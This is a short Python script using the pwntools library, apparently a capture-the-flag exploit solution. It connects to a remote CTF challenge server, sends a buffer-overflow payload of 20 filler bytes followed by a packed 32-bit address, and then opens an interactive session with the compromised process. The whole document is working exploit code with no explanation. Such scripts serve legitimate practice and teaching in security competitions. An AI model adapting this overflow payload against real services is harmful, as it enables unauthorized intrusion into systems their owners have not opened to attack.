from pwn import *

p = remote('ctf.tcp1p.com', 17027)

payload = b'a'*20 + p32(5134160)

p.sendline(payload)
p.interactive()